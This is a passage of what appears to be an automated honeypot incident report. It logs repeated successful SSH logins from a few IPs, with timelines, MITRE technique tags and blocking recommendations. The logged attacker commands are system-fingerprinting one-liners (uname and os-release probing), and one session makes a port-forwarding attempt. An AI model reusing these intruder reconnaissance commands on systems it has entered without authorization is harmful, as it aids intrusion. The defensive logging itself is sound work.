| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:29:59` | `cowrie.session.connect` |
| `2026-07-06 04:30:00` | `cowrie.client.version` |
| `2026-07-06 04:30:00` | `cowrie.client.kex` |
| `2026-07-06 04:30:03` | `cowrie.login.success` |
| `2026-07-06 04:30:05` | `cowrie.session.params` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.success` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:05` | `cowrie.command.input` |
| `2026-07-06 04:30:06` | `cowrie.log.closed` |
| `2026-07-06 04:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2041a36fc77c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:30 |
| **Last Seen** | 2026-07-06 04:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:30:50` | `cowrie.session.connect` |
| `2026-07-06 04:30:50` | `cowrie.client.version` |
| `2026-07-06 04:30:50` | `cowrie.client.kex` |
| `2026-07-06 04:30:54` | `cowrie.login.success` |
| `2026-07-06 04:30:56` | `cowrie.session.params` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.success` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:56` | `cowrie.command.input` |
| `2026-07-06 04:30:57` | `cowrie.log.closed` |
| `2026-07-06 04:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdea9f87ca17

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 04:31 |
| **Last Seen** | 2026-07-06 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:31:42` | `cowrie.session.connect` |
| `2026-07-06 04:31:42` | `cowrie.client.version` |
| `2026-07-06 04:31:42` | `cowrie.client.kex` |
| `2026-07-06 04:31:42` | `cowrie.login.success` |
| `2026-07-06 04:31:42` | `cowrie.direct-tcpip.request` |
| `2026-07-06 04:31:42` | `cowrie.direct-tcpip.data` |
| `2026-07-06 04:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4224974462

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:31 |
| **Last Seen** | 2026-07-06 04:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:31:42` | `cowrie.session.connect` |
| `2026-07-06 04:31:42` | `cowrie.client.version` |
| `2026-07-06 04:31:42` | `cowrie.client.kex` |
| `2026-07-06 04:31:45` | `cowrie.login.success` |
| `2026-07-06 04:31:48` | `cowrie.session.params` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.success` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:48` | `cowrie.command.input` |
| `2026-07-06 04:31:49` | `cowrie.log.closed` |
| `2026-07-06 04:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa0179c2c5b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:31 |
| **Last Seen** | 2026-07-06 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:31:45` | `cowrie.session.connect` |
| `2026-07-06 04:31:45` | `cowrie.client.version` |
| `2026-07-06 04:31:45` | `cowrie.client.kex` |
| `2026-07-06 04:31:45` | `cowrie.login.success` |
| `2026-07-06 04:31:46` | `cowrie.session.params` |
| `2026-07-06 04:31:46` | `cowrie.command.input` |
| `2026-07-06 04:31:46` | `cowrie.log.closed` |
| `2026-07-06 04:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547a3c1e620e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:32 |
| **Last Seen** | 2026-07-06 04:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:32:33` | `cowrie.session.connect` |
| `2026-07-06 04:32:33` | `cowrie.client.version` |
| `2026-07-06 04:32:33` | `cowrie.client.kex` |
| `2026-07-06 04:32:37` | `cowrie.login.success` |
| `2026-07-06 04:32:39` | `cowrie.session.params` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.success` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.command.input` |
| `2026-07-06 04:32:39` | `cowrie.log.closed` |
| `2026-07-06 04:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a936678b9b0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:33 |
| **Last Seen** | 2026-07-06 04:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:33:26` | `cowrie.session.connect` |
| `2026-07-06 04:33:27` | `cowrie.client.version` |
| `2026-07-06 04:33:27` | `cowrie.client.kex` |
| `2026-07-06 04:33:30` | `cowrie.login.success` |
| `2026-07-06 04:33:32` | `cowrie.session.params` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.success` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.command.input` |
| `2026-07-06 04:33:32` | `cowrie.log.closed` |
| `2026-07-06 04:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc8bae17e4d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:33 |
| **Last Seen** | 2026-07-06 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:33:40` | `cowrie.session.connect` |
| `2026-07-06 04:33:40` | `cowrie.client.version` |
| `2026-07-06 04:33:40` | `cowrie.client.kex` |
| `2026-07-06 04:33:40` | `cowrie.login.success` |
| `2026-07-06 04:33:41` | `cowrie.session.params` |
| `2026-07-06 04:33:41` | `cowrie.command.input` |
| `2026-07-06 04:33:41` | `cowrie.log.closed` |
| `2026-07-06 04:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14f1f3f319f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:34 |
| **Last Seen** | 2026-07-06 04:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:34:18` | `cowrie.session.connect` |
| `2026-07-06 04:34:19` | `cowrie.client.version` |
| `2026-07-06 04:34:19` | `cowrie.client.kex` |
| `2026-07-06 04:34:22` | `cowrie.login.success` |
| `2026-07-06 04:34:24` | `cowrie.session.params` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.success` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.command.input` |
| `2026-07-06 04:34:24` | `cowrie.log.closed` |
| `2026-07-06 04:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de7272b23cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:35 |
| **Last Seen** | 2026-07-06 04:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:35:08` | `cowrie.session.connect` |
| `2026-07-06 04:35:09` | `cowrie.client.version` |
| `2026-07-06 04:35:09` | `cowrie.client.kex` |
| `2026-07-06 04:35:12` | `cowrie.login.success` |
| `2026-07-06 04:35:14` | `cowrie.session.params` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.success` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:14` | `cowrie.command.input` |
| `2026-07-06 04:35:15` | `cowrie.log.closed` |
| `2026-07-06 04:35:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b4d96bdbfc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:35 |
| **Last Seen** | 2026-07-06 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:35:34` | `cowrie.session.connect` |
| `2026-07-06 04:35:34` | `cowrie.client.version` |
| `2026-07-06 04:35:34` | `cowrie.client.kex` |
| `2026-07-06 04:35:35` | `cowrie.login.success` |
| `2026-07-06 04:35:36` | `cowrie.session.params` |
| `2026-07-06 04:35:36` | `cowrie.command.input` |
| `2026-07-06 04:35:36` | `cowrie.log.closed` |
| `2026-07-06 04:35:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93a915fddee8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:36 |
| **Last Seen** | 2026-07-06 04:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:36:00` | `cowrie.session.connect` |
| `2026-07-06 04:36:00` | `cowrie.client.version` |
| `2026-07-06 04:36:00` | `cowrie.client.kex` |
| `2026-07-06 04:36:04` | `cowrie.login.success` |
| `2026-07-06 04:36:06` | `cowrie.session.params` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.success` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.command.input` |
| `2026-07-06 04:36:06` | `cowrie.log.closed` |
| `2026-07-06 04:36:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1daf084c932f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:36 |
| **Last Seen** | 2026-07-06 04:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:36:52` | `cowrie.session.connect` |
| `2026-07-06 04:36:52` | `cowrie.client.version` |
| `2026-07-06 04:36:52` | `cowrie.client.kex` |
| `2026-07-06 04:36:56` | `cowrie.login.success` |
| `2026-07-06 04:36:59` | `cowrie.session.params` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.success` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:36:59` | `cowrie.command.input` |
| `2026-07-06 04:37:00` | `cowrie.log.closed` |
| `2026-07-06 04:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a962fcc9dcc7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:37 |
| **Last Seen** | 2026-07-06 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:37:23` | `cowrie.session.connect` |
| `2026-07-06 04:37:23` | `cowrie.client.version` |
| `2026-07-06 04:37:23` | `cowrie.client.kex` |
| `2026-07-06 04:37:23` | `cowrie.login.success` |
| `2026-07-06 04:37:24` | `cowrie.session.params` |
| `2026-07-06 04:37:24` | `cowrie.command.input` |
| `2026-07-06 04:37:24` | `cowrie.log.closed` |
| `2026-07-06 04:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf5c6a98255f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:37 |
| **Last Seen** | 2026-07-06 04:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:37:43` | `cowrie.session.connect` |
| `2026-07-06 04:37:43` | `cowrie.client.version` |
| `2026-07-06 04:37:43` | `cowrie.client.kex` |
| `2026-07-06 04:37:46` | `cowrie.login.success` |
| `2026-07-06 04:37:49` | `cowrie.session.params` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.success` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
